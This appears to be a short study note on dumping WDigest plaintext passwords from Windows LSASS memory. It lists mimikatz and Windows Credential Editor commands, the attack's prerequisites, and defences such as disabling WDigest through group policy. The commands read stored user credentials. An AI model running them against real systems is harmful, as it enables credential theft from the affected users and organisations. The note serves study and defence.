
Extract WDigest plain text password

mimikatz 
privilege::debug 
sekurlsa::wdigest

Windows Credential Editor tool 
wce.exe -w

How Digest Authentication Works
![[Pasted image 20231013154028.png]]

Attack’s pre-requisites - WDigest is enabled - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump

Protection - Disable WDigest - Enforce it through group policies